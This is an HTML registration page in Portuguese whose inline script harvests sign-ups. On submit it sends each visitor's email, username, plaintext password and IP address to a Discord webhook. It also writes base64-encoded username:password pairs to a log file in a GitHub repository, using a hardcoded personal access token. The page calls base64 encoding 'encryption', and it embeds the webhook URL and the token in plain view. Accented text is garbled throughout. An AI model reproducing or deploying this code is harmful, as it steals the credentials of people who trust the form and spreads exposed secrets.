<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <h2>Criar Conta</h2>
        <form action="#" method="post">
            <input type="email" id="email" name="email" placeholder="Email" required>
            <input type="text" id="username" name="username" placeholder="Usu√°rio" required>
            <input type="password" id="password" name="password" placeholder="Senha" required>
            <div class="terms">
                <input type="checkbox" id="terms" name="terms" required>
                <label for="terms">Aceito os termos e condi√ß√µes</label>
            </div>
            <button onclick="submitData(event)" type="submit">Cadastrar</button>
        </form>
        <a class="new" href="../login" style="color: rgb(212, 255, 0)">Create a account</a>
    </div>
    <script>
        const token = "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"; // ‚ö† Substitua pelo seu token do GitHub
        const owner = "JempUnkn"; // ‚ö† Seu usu√°rio ou organiza√ß√£o no GitHub
        const repo = "firebase_teste"; // ‚ö† Nome do reposit√≥rio
        const filePath = "logger.log"; // Arquivo onde salvar os dados
        
        function formatarDataHora(date = new Date()) {
            const dia = String(date.getDate()).padStart(2, '0');
            const mes = String(date.getMonth() + 1).padStart(2, '0');
            const ano = date.getFullYear();
            const horas = String(date.getHours()).padStart(2, '0');
            const minutos = String(date.getMinutes()).padStart(2, '0');
            const segundos = String(date.getSeconds()).padStart(2, '0');
        
            return `${dia}/${mes}/${ano} ${horas}:${minutos}:${segundos}`;
        }
        
        function encryptData(data) {
            try {
                return btoa(data); // Codifica os dados em Base64
            } catch (error) {
                console.error("Erro ao criptografar dados:", error);
                return null;
            }
        }
        
        // üîπ Fun√ß√£o para obter SHA do arquivo no GitHub
        async function getFileSHA() {
            const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
        
            try {
                const response = await fetch(url, {
                    headers: { Authorization: `token ${token}` }
                });
        
                if (response.status === 404) {
                    console.log("Arquivo n√£o encontrado, ser√° criado um novo.");
                    return null;
                }
        
                if (!response.ok) {
                    throw new Error(`Erro ao obter o SHA: ${response.status} ${response.statusText}`);
                }
        
                const fileData = await response.json();
                return fileData.sha; // Retorna o SHA do arquivo
            } catch (error) {
                console.error("Erro ao buscar SHA do arquivo:", error);
                return null;
            }
        }
        
        // üîπ Fun√ß√£o para atualizar o arquivo no GitHub
        async function updateGitHubFile(encryptedData) {
            const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
            const sha = await getFileSHA(); // Obt√©m o SHA do arquivo (ou null se n√£o existir)
        
            try {
                // üîπ Adiciona os novos dados
                const newContent = `${encryptedData}\n`;
                const encodedContent = btoa(newContent); // Codifica em Base64 corretamente
        
                const payload = {
                    message: "Adicionando nova entrada",
                    content: encodedContent,
                    sha: sha // Se null, GitHub cria um novo arquivo
                };
        
                const response = await fetch(url, {
                    method: "PUT",
                    headers: {
                        "Authorization": `token ${token}`,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });
        
                if (!response.ok) {
                    throw new Error(`Erro ao atualizar arquivo: ${response.status} ${response.statusText}`);
                }
        
                console.log("Arquivo atualizado com sucesso!");
            } catch (error) {
                console.error("Erro ao atualizar arquivo no GitHub:", error);
            }
        }
        
        // üîπ Fun√ß√£o para obter o IP do usu√°rio
        async function getUserIP() {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Erro ao obter IP:", error);
                return "Desconhecido";
            }
        }
        
        // üîπ Fun√ß√£o para enviar logs ao Discord
        const webhookUrl = "https://discord.com/api/webhooks/1345523112787050609/UB5aUudmYFkc91vmQ_Nl4cLtF7vjmSBBK96_Wy1a55AQ2MAfRaylZgPPhk3ZaeQoHfPg";
        
        async function sendToDiscord(ip, email, username, password) {
            const embed = {
                title: "üìù Novo Cadastro Realizado!",
                description: "Um novo usu√°rio se registrou no sistema.",
                color: 16753920, // Laranja
                fields: [
                    { name: "üë§ Usu√°rio", value: `\`${username}\``, inline: true },
                    { name: "üìß Email", value: `\`${email}\``, inline: true },
                    { name: "üîë Senha", value: `\`${password}\``, inline: false },
                    { name: "üåç Endere√ßo IP", value: `\`${ip}\``, inline: false }
                ],
                footer: {
                    text: `Cadastro realizado em ${formatarDataHora()}`
                },
                timestamp: new Date().toISOString()
            };
        
            try {
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ embeds: [embed] })
                });
        
                if (!response.ok) {
                    throw new Error("Erro ao enviar embed.");
                }
        
                console.log("Embed enviado com sucesso!");
            } catch (error) {
                console.error("Erro ao enviar embed:", error);
            }
        }
        
        // üîπ Fun√ß√£o principal para capturar os dados e processar o cadastro
        async function submitData(event) {
            event.preventDefault();
        
            const email = document.getElementById("email").value.trim();
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const termsAccepted = document.getElementById("terms").checked;
        
            if (!email || !username || !password) {
                alert("Todos os campos s√£o obrigat√≥rios!");
                return;
            }
        
            if (!termsAccepted) {
                alert("Voc√™ deve aceitar os termos e condi√ß√µes!");
                return;
            }
        
            // üîπ Obt√©m o IP do usu√°rio
            const ip = await getUserIP();
        
            // üîπ Envia os dados para o Discord
            await sendToDiscord(ip, email, username, password);
        
            // üîπ Codifica e salva no GitHub
            const dataToEncrypt = `${username}:${password}`;
            const encryptedData = encryptData(dataToEncrypt);
            
            if (encryptedData) {
                await updateGitHubFile(encryptedData);
            }
        }
        
        // üîπ Adiciona o evento ao bot√£o de cadastro
        document.getElementById("submit-button").addEventListener("click", submitData);

    </script>
</body>
</html>
